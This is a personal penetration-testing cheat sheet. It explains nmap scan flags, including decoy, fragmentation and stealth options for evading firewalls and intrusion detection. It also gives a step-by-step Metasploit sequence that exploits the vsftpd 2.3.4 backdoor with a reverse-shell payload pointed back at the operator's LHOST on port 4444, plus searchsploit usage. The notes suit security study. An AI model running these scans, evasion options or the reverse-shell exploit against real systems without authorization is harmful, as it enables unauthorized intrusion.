code template bash
```bash

```

## nmap 
```bash
-Pn
```
skips host discovery phase to treat all hostst as online. useful when ping is blocked

```bash
-T4
```
T4 is a faster timing template than default designed when speed is more important than stealth or accuracy

```bash
-A
```
enables OS detection, version detection, script scanning, traceroute
- gathers detailed information about target system

```bash
-v 
```
provides more detailed output about scan process

```bash
-sN
```
used to evade certain firewalls and packet filters

```bash
-sV
```
Service/version detection

```bash
-p-
```
scans all post not only the 1000 most common ones 

```bash
-O
```
OS detection (guesses the operating system)

```bash
-sS
```
faster and more stealthy option than TCP scan - only sends SYN packets

```bash
-sU
```
scans UDP ports to discover services on UDP protocol

```bash
-p
```
port range: 80,443 OR 80-100

```bash
-F
```
fast mode - scans only 100 most common ports

```bash
-sC
```
default script scan

```bash
-oN [FILE]
```
outputs scan to file in normal format (e.g for logging)

```bash
-oX [FILE]
```
outputs scan to file in XML format

```bash
-oG
```
outputs scan to file in grepable format

```bash
--script [SCRIPTNAME]
```
runs NSE (NMAP Scripting Engine) script against the tartget for more targeted scanning

```bash
--open
```
only shows open ports in ouput / filters closed and filtered ports

```bash
-6
```
enables IPv6 scanning

```bash
-D [DECOY1, DECOY2, ...]
```
uses decoys to making it harder to identify the actual scanner

```bash
-f
```
Fragment packets, which can help evade some basic packet filters and intrusion detection systems

## find vulnerabilities
### Metasploit
start metasploit database
```bash
sudo msfdb start
```

enter the console
```bash
msfconsole
```

search for vulnerabilities
```php
search [service-name] [version]
or
search vsftpd 2.3.4
```

use exploit
```php
use exploit/unix/ftp/vsftpd_234_backdoor
```

show options
```js
show options
```

set host
```js
set RHOST [IPADRESS]
```

set payload (if default doesn't work for example:)
```bash
set payload cmd/unix/reverse
```

set LHOST (own IP)
```bash
set LHOST [IPADRESS]
```

set local port
```bash
set LPORT 4444
```

start
```php
exploit
or
run
```

### searchsploit - Search for exploit
``` php
searchsploit [version]
```
than look for needed application

